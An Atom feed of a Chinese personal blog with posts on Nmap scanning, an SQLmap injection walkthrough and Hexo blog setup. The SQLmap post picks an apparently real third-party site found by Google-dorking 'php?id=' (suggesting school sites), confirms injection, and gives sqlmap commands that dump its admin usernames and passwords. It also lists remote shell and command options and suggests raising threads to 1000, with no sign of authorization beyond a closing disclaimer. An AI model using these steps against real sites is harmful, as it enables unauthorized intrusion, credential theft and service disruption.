<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>IYii&#39;s Blog</title>
  
  <subtitle>A programmer&#39;s daily routine.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://iyii.me/"/>
  <updated>2018-07-22T04:51:52.224Z</updated>
  <id>http://iyii.me/</id>
  
  <author>
    <name>IYii</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透工具之Nmap使用</title>
    <link href="http://iyii.me/2018/07/22/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BNmap%E4%BD%BF%E7%94%A8/"/>
    <id>http://iyii.me/2018/07/22/渗透工具之Nmap使用/</id>
    <published>2018-07-22T04:38:01.000Z</published>
    <updated>2018-07-22T04:51:52.224Z</updated>
    
    <content type="html"><![CDATA[<p>本篇是介绍端口扫描工具Nmap的使用方法。Nmap在渗透测试中经常用到，它不仅可以用来确定目标网络上计算机的存活状态，而且可以扫描各个计算机的操作系统、开放端口、服务，还有可能获得用户的证书。熟练掌握 Nmap 的用法，可以极大的提高渗透测试技术。</p><h2 id="Nmap的安装"><a href="#Nmap的安装" class="headerlink" title="Nmap的安装"></a>Nmap的安装</h2><h3 id="Window："><a href="#Window：" class="headerlink" title="Window："></a>Window：</h3><p>可以去<a href="https://nmap.org/download.html" target="_blank" rel="noopener">官网</a>找到相对应的版本进行下载</p><h3 id="Ubuntu："><a href="#Ubuntu：" class="headerlink" title="Ubuntu："></a>Ubuntu：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nmap</span><br></pre></td></tr></table></figure><h2 id="Nmap的命令格式"><a href="#Nmap的命令格式" class="headerlink" title="Nmap的命令格式"></a>Nmap的命令格式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -[option][IP or domain] -oN [fileName.txt]</span><br></pre></td></tr></table></figure><p>想全面了解可以与nmap结合使用的所有参数，请使用“nmap –help”命令。</p><h2 id="常用参数说明"><a href="#常用参数说明" class="headerlink" title="常用参数说明"></a>常用参数说明</h2><h3 id="TCP-扫描"><a href="#TCP-扫描" class="headerlink" title="TCP 扫描"></a>TCP 扫描</h3><p>端口扫描中最稳定的，利用的是TCP三次握手。TCP扫描通常用于收集有关目标的更多信息，但是会和目标主机建立一个完成的 TCP 连接。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -Pn 127.0.0.1     //-sT TCP 连接扫描（s ==&gt; 哪种类型扫描；T ==&gt; TCP 类型）</span><br></pre></td></tr></table></figure></p><h3 id="SYN-扫描"><a href="#SYN-扫描" class="headerlink" title="SYN 扫描"></a>SYN 扫描</h3><p>TCP 两次握手（隐藏扫描，速度快，nmap 缺省参数）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -Pn 127.0.0.1</span><br></pre></td></tr></table></figure></p><h3 id="用主机名和IP地址扫描系统"><a href="#用主机名和IP地址扫描系统" class="headerlink" title="用主机名和IP地址扫描系统"></a>用主机名和IP地址扫描系统</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 127.0.0.1`或者`nmap www.xxxx.com</span><br></pre></td></tr></table></figure><h3 id="扫描使用“-v”选项"><a href="#扫描使用“-v”选项" class="headerlink" title="扫描使用“-v”选项"></a>扫描使用“-v”选项</h3><p>使用“ -v “选项后给出了远程机器更详细的信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v 127.0.0.1</span><br></pre></td></tr></table></figure></p><h3 id="扫描多台主机"><a href="#扫描多台主机" class="headerlink" title="扫描多台主机"></a>扫描多台主机</h3><p>你可以简单的在Nmap命令后加上多个IP地址或主机名来扫描多台主机。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v 127.0.0.1 127.0.0.2 127.0.0.3</span><br></pre></td></tr></table></figure></p><h3 id="扫描整个子网"><a href="#扫描整个子网" class="headerlink" title="扫描整个子网"></a>扫描整个子网</h3><p>你可以使用*通配符来扫描整个子网或某个范围的IP地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v 127.0.0.*</span><br></pre></td></tr></table></figure></p><h3 id="使用IP地址的最后一个字节扫描多台服务器"><a href="#使用IP地址的最后一个字节扫描多台服务器" class="headerlink" title="使用IP地址的最后一个字节扫描多台服务器"></a>使用IP地址的最后一个字节扫描多台服务器</h3><p>你可以简单的指定IP地址的最后一个字节来对多个IP地址进行扫描。例如，我在下面执行中扫描了IP地址192.168.0.101，192.168.0.102和192.168.0.103。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v 127.0.0.1,2,3</span><br></pre></td></tr></table></figure></p><h3 id="从一个文件中扫描主机列表"><a href="#从一个文件中扫描主机列表" class="headerlink" title="从一个文件中扫描主机列表"></a>从一个文件中扫描主机列表</h3><p>如果你有多台主机需要扫描且所有主机信息都写在一个文件中，那么你可以直接让nmap读取该文件来执行扫描，让我们来看看如何做到这一点。<br>创建一个名为“nmaptest.txt”的文本文件，并定义所有你想要扫描的服务器IP地址或主机名。<br>接下来运行带“iL” 选项的nmap命令来扫描文件中列出的所有IP地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -iL nmaptest.txt</span><br></pre></td></tr></table></figure></p><h3 id="扫描操作系统信息和路由跟踪"><a href="#扫描操作系统信息和路由跟踪" class="headerlink" title="扫描操作系统信息和路由跟踪"></a>扫描操作系统信息和路由跟踪</h3><p>使用Nmap，你可以检测远程主机上运行的操作系统和版本。为了启用操作系统和版本检测，脚本扫描和路由跟踪功能，我们可以使用NMAP的“-A“选项。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 127.0.0.1</span><br></pre></td></tr></table></figure></p><h3 id="启用Nmap的操作系统探测功能"><a href="#启用Nmap的操作系统探测功能" class="headerlink" title="启用Nmap的操作系统探测功能"></a>启用Nmap的操作系统探测功能</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="扫描主机侦测防火墙"><a href="#扫描主机侦测防火墙" class="headerlink" title="扫描主机侦测防火墙"></a>扫描主机侦测防火墙</h3><p>下面的命令将扫描远程主机以探测该主机是否使用了包过滤器或防火墙。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sA 127.0.0.1</span><br></pre></td></tr></table></figure></p><h3 id="扫描主机检测是否有防火墙保护"><a href="#扫描主机检测是否有防火墙保护" class="headerlink" title="扫描主机检测是否有防火墙保护"></a>扫描主机检测是否有防火墙保护</h3><p>扫描主机检测其是否受到数据包过滤软件或防火墙的保护。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PN 192.168.0.101</span><br></pre></td></tr></table></figure></p><h3 id="找出网络中的在线主机"><a href="#找出网络中的在线主机" class="headerlink" title="找出网络中的在线主机"></a>找出网络中的在线主机</h3><p>使用“-sP”选项，我们可以简单的检测网络中有哪些在线主机，该选项会跳过端口扫描和其他一些检测。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 127.0.0.*</span><br></pre></td></tr></table></figure></p><h3 id="顺序扫描端口"><a href="#顺序扫描端口" class="headerlink" title="顺序扫描端口"></a>顺序扫描端口</h3><p>使用“-r”选项表示不会随机的选择端口扫描。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -r 127.0.0.1</span><br></pre></td></tr></table></figure></p><h3 id="扫描特定的端口"><a href="#扫描特定的端口" class="headerlink" title="扫描特定的端口"></a>扫描特定的端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="扫描多个端口"><a href="#扫描多个端口" class="headerlink" title="扫描多个端口"></a>扫描多个端口</h3><p>你还可以使用选项“-P”来扫描多个端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80,443 127.0.0.1</span><br></pre></td></tr></table></figure></p><h3 id="扫描指定范围内的端口"><a href="#扫描指定范围内的端口" class="headerlink" title="扫描指定范围内的端口"></a>扫描指定范围内的端口</h3><p>您可以使用表达式来扫描某个范围内的端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80-160 127.0.0.1</span><br></pre></td></tr></table></figure></p><h3 id="查看Nmap的版本"><a href="#查看Nmap的版本" class="headerlink" title="查看Nmap的版本"></a>查看Nmap的版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -V</span><br></pre></td></tr></table></figure><p><strong>常用的命令大概有这么几个，当然不是全部，更多的命令选项可以去官网那里有详细的介绍</strong>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本篇是介绍端口扫描工具Nmap的使用方法。Nmap在渗透测试中经常用到，它不仅可以用来确定目标网络上计算机的存活状态，而且可以扫描各个计算机的操作系统、开放端口、服务，还有可能获得用户的证书。熟练掌握 Nmap 的用法，可以极大的提高渗透测试技术。&lt;/p&gt;
&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="WEB安全" scheme="http://iyii.me/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Nmap" scheme="http://iyii.me/tags/Nmap/"/>
    
  </entry>
  
  <entry>
    <title>记一次SQLmap注入实战</title>
    <link href="http://iyii.me/2018/07/21/%E8%AE%B0%E4%B8%80%E6%AC%A1SQLmap%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98/"/>
    <id>http://iyii.me/2018/07/21/记一次SQLmap注入实战/</id>
    <published>2018-07-21T03:19:36.000Z</published>
    <updated>2018-07-21T05:10:32.178Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>Sqlmap是一种开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令.</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote><p>$ git clone <a href="https://github.com/sqlmapproject/sqlmap.git" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap.git</a> sqlmap-dev</p></blockquote><h2 id="基本使用方法"><a href="#基本使用方法" class="headerlink" title="基本使用方法:"></a>基本使用方法:</h2><h3 id="GET"><a href="#GET" class="headerlink" title="GET:"></a>GET:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot;    // 测试该注入点是否能够进行注入</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; --dbs    // 对注入点进行注入,并导出数据库名</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; -D database --tables    // 对database这个数据库进行表的猜测</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; -D database -T admin --columns    // 对database下的admin表中字段进行猜测</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; -D database -T admin -C user,password --dump</span><br><span class="line"></span><br><span class="line">// 对database下的admin表中user和password字段进行猜测并dump</span><br></pre></td></tr></table></figure><h3 id="POST"><a href="#POST" class="headerlink" title="POST:"></a>POST:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -r header.txt</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -r header.txt --dbs</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// -r是从一个文件中载入HTTP请求</span><br><span class="line"></span><br><span class="line">// 其余都与GET一样将-u部分改成-r</span><br><span class="line"></span><br><span class="line">// header.txt</span><br><span class="line"></span><br><span class="line">POST /index.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 127.0.0.1</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: http://127.0.0.1/index.php</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line">id=1</span><br></pre></td></tr></table></figure><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie:"></a>Cookie:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php&quot; --cookie=&quot;id=1&quot; --level=2</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 其余与GET一样,别忘记加上--cookie参数</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他:"></a>其他:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; --os-shell    // 获取远程主机的shell</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; --os-cmd=&quot;whoami&quot;    // 执行远程主机的命令</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; --is-dba    // 检查DBMS用户是否为DBA</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -g &quot;inurl:php?id=&quot;    // 通过google寻找url带有php?id=字段的地址</span><br></pre></td></tr></table></figure><h2 id="实战开始"><a href="#实战开始" class="headerlink" title="实战开始"></a>实战开始</h2><h3 id="找到潜在的攻击目标"><a href="#找到潜在的攻击目标" class="headerlink" title="找到潜在的攻击目标"></a>找到潜在的攻击目标</h3><p>第一步是找到有SQL注入漏洞的网站。如果你没有特定攻击目标，可以使用Google搜索 php?id=1 （或php?id= ＋ 学校）：</p><blockquote><p>找到目标 <a href="http://test.net/about.php?id=12" target="_blank" rel="noopener">http://test.net/about.php?id=12</a>   //这里我就用test代替网址了</p></blockquote><p>检测是否有SQL注入漏洞；在url后添加一个单符号（’），使用浏览器访问</p><blockquote><p><a href="http://test.net/about.php?id=12" target="_blank" rel="noopener">http://test.net/about.php?id=12</a> ‘      //如果网站没有SQL注入漏洞，使用上面的地址访问不会有问题。如果有SQL注入漏洞，会有错误输出：</p></blockquote><p><img src="/upload_image/2018-07-21 12-02-10屏幕截图.png" alt=""></p><p>加上 and 1=1 和 and 1=2 ,一个正常显示，一个报错，可以确定存在注入漏洞了。</p><p>下面来对注入点进行注入,并导出数据库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python2 sqlmap.py -u &quot;http://test.net/about.php?id=12&quot; --dbs</span><br></pre></td></tr></table></figure><p>自动探测数据库类型和漏洞，如果成功会列出数据库：</p><p><img src="/upload_image/2018-07-21 12-28-01屏幕截图.png" alt="数据库"></p><p>从这几个表的名称可以猜测出来，应该是这个xcdy表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python2 sqlmap.py -u &quot;http://test.net/about.php?id=12&quot; -D xcdy --tables</span><br></pre></td></tr></table></figure><p><img src="/upload_image/2018-07-21 12-34-53屏幕截图.png" alt=""></p><p>接下来获取表的字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python2 sqlmap.py -u &quot;http://test.net/about.php?id=12&quot; -D xcdy -T t_admin --columns</span><br></pre></td></tr></table></figure><p><img src="/upload_image/2018-07-21 12-41-55屏幕截图.png" alt=""></p><p>对 xcdy 下的t_admin表中username和pwd字段进行猜测并dump:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;hhttp://test.net/about.php?id=12&quot; -D xcdy -T t_admin -C user,password --dump</span><br></pre></td></tr></table></figure><p><img src="/upload_image/2018-07-21 13-07-06屏幕截图.png" alt=""></p><p>好了，账号和密码都出来了。</p><p>这次实战主要是为了对SQLmap加深理解。</p><h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><p>大家基本上都会遇到，sqlmap注入很慢，这是因为sqlmap默认的最大线程是10.<br>下面给出sqlmap修改最大线程数的方法;前提是:你的目标站服务器能抗住就行。</p><h3 id="修改方法"><a href="#修改方法" class="headerlink" title="修改方法"></a>修改方法</h3><p>找到settings.py文件,具体在\lib\core\目录下</p><p>找到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Maximum number of threads (avoiding connection issues and/or DoS)</span><br><span class="line">MAX_NUMBER_OF_THREADS = 10修改为MAX_NUMBER_OF_THREADS = 1000</span><br></pre></td></tr></table></figure><p>本文中提及的技术只适用于合法的渗透测试，请勿用于其他的非法用途，如用作其他非法用途于本文作者无关。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Sqlmap是一种开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检
      
    
    </summary>
    
      <category term="WEB安全" scheme="http://iyii.me/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQLmap" scheme="http://iyii.me/tags/SQLmap/"/>
    
  </entry>
  
  <entry>
    <title>HEXO主题NEXT配置</title>
    <link href="http://iyii.me/2018/02/22/HEXO%E4%B8%BB%E9%A2%98NEXT%E9%85%8D%E7%BD%AE%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://iyii.me/2018/02/22/HEXO主题NEXT配置（二）/</id>
    <published>2018-02-22T10:11:24.000Z</published>
    <updated>2018-07-21T03:07:08.838Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="技术杂谈" scheme="http://iyii.me/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="HEXO" scheme="http://iyii.me/tags/HEXO/"/>
    
  </entry>
  
  <entry>
    <title>HEXO搭建GitHub博客（一）</title>
    <link href="http://iyii.me/2018/02/20/HEXO%E6%90%AD%E5%BB%BAGitHub%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://iyii.me/2018/02/20/HEXO搭建GitHub博客（一）/</id>
    <published>2018-02-19T16:00:00.000Z</published>
    <updated>2018-02-22T10:17:46.529Z</updated>
    
    <content type="html"><![CDATA[<p>现在越来越多的人喜欢利用Github搭建静态网站，原因不外乎简单省钱。本人也利用hexo+github搭建了本博客，用于分享一些心得。在此过程中，折腾博客的各种配置以及功能占具了我一部分时间，在此详细记录下我是如何利用hexo+github搭建静态博客以及一些配置相关问题，以免过后遗忘，且当备份之用。<br><strong>因本人使用的是Linux，所以本教程以Ubuntu为参考，其实Ubuntu与windows搭建github博客相差无几，如果有用windows的小伙伴感到不适，可以参考<a href="https://www.jianshu.com/p/701b1095da11" target="_blank" rel="noopener">手把手教你建github技术博客教程</a>。</strong></p><h2 id="前期工作"><a href="#前期工作" class="headerlink" title="前期工作"></a>前期工作</h2><ul><li><p>注册<a href="https://github.com/" target="_blank" rel="noopener">GitHub</a> （官网进行注册）。</p></li><li><p>下载<a href="https://nodejs.org/en/" target="_blank" rel="noopener">node.js</a>并安装（官网下载安装），默认会安装npm。</p></li><li><p>下载安装<a href="https://git-scm.com/" target="_blank" rel="noopener">git</a>（Linux默认安装git，如果没有请到官网下载安装）。</p></li><li><p>下载安装<a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">hexo</a>。</p></li></ul><h2 id="本地搭建hexo静态博客"><a href="#本地搭建hexo静态博客" class="headerlink" title="本地搭建hexo静态博客"></a>本地搭建hexo静态博客</h2><pre><code>// 建立一个博客文件夹，并初始化博客，&lt;folder&gt;为文件夹的名称，可以随便起名字$ hexo init &lt;folder&gt;// 进入博客文件夹，&lt;folder&gt;为文件夹的名称$ cd &lt;folder&gt;// node.js的命令，根据博客既定的dependencies配置安装所有的依赖包$ npm install</code></pre><h3 id="HEXO常用命令"><a href="#HEXO常用命令" class="headerlink" title="HEXO常用命令"></a>HEXO常用命令</h3><ul><li><code>hexo n &quot;我的博客&quot;</code> == <code>hexo new &quot;我的博客&quot;</code> #新建文章</li><li><code>hexo clean</code> #清除缓存 网页正常情况下可以忽略此条命令</li><li><code>hexo s</code> == <code>hexo server</code> #启动服务预览</li><li><code>hexo g</code> == <code>hexo generate</code>#生成</li><li><code>hexo d</code> == <code>hexo deploy</code>#部署</li><li>hexo d -g == hexo deploy + hexo generate</li></ul><h2 id="将博客与GitHub关联"><a href="#将博客与GitHub关联" class="headerlink" title="将博客与GitHub关联"></a>将博客与GitHub关联</h2><ul><li>在Github上创建名字为XXX.github.io的项目，XXX为自己的github用户名。</li><li>打开本地的MyBlog文件夹项目内的_config.yml配置文件，将其中的type设置为git</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://github.com/XXXXXX/XXXXXX.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><ul><li>运行：<em>npm install hexo-deployer-git –save</em></li><li>运行：<em>hexo g</em>（本地生成静态文件）</li><li>运行：<em>hexo d</em>（将本地静态文件推送至Github）</li></ul><h2 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h2><p>博客已经搭建好，也能通过github的域名访问，但总归还是用自己的域名比较舒服。因为我们需要设置将自己的域名绑定到github这个博客项目上。</p><ul><li>域名提供商设置</li></ul><p>添加2条A记录：</p><p>@—&gt;192.30.252.154</p><p>@—&gt;192.30.252.153</p><p>添加一条CNAME记录：</p><p>CNAME—&gt;XXXXXX.github.io</p><ul><li>博客添加CNAME文件</li></ul><p>配置完域名解析后，进入博客目录，在source目录下新建CNAME文件，写入域名，如：iyi.me (这里我们需要注意的是：CNAME文件添加的目录是在根目录下的source文件夹，而不是.deploy_git文件夹，完成添加后重新部署，博客网站又会恢复正常。)</p><ul><li>hexo g</li><li>hexo d</li></ul><h2 id="更新博客内容"><a href="#更新博客内容" class="headerlink" title="更新博客内容"></a>更新博客内容</h2><p>​    至此博客已经搭建完毕，域名也已经正常解析，那么剩下的问题就是更新内容了。</p><h3 id="更新文章"><a href="#更新文章" class="headerlink" title="更新文章"></a>更新文章</h3><ul><li>在MyBlog目录下执行：<em>hexo new “我的第一篇文章”</em>，会在source-&gt;_posts文件夹内生成一个.md文件。</li><li>编辑该文件（遵循Markdown规则）</li><li>修改起始字段<ul><li>title 文章的标题</li><li>date 创建日期 （文件的创建日期 ）</li><li>updated 修改日期 （ 文件的修改日期）</li><li>comments 是否开启评论 true</li><li>tags 标签</li><li>categories 分类</li><li>permalink url中的名字（文件名）</li></ul></li><li>编写正文内容（MakeDown）</li></ul><p>保存后，我们进行本地发布：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>打开浏览器，输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:4000/</span><br></pre></td></tr></table></figure><p>我们可以在浏览器端看到我们搭建好的博客和发布的文章了。</p><h3 id="文章内插入图片"><a href="#文章内插入图片" class="headerlink" title="文章内插入图片"></a>文章内插入图片</h3><p>在文章中写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](/upload_image/1.jpg)</span><br></pre></td></tr></table></figure><p>​    然后进入themes-主题名-source-upload_image目录下(自己创建)，将图片放到这个目录下，就可以了。</p><p>说明：当执行hexo g命令时，会自动把图片复制到 public文件的upload_image目录下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;现在越来越多的人喜欢利用Github搭建静态网站，原因不外乎简单省钱。本人也利用hexo+github搭建了本博客，用于分享一些心得。在此过程中，折腾博客的各种配置以及功能占具了我一部分时间，在此详细记录下我是如何利用hexo+github搭建静态博客以及一些配置相关问题，
      
    
    </summary>
    
      <category term="技术杂谈" scheme="http://iyii.me/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="HEXO" scheme="http://iyii.me/tags/HEXO/"/>
    
  </entry>
  
</feed>
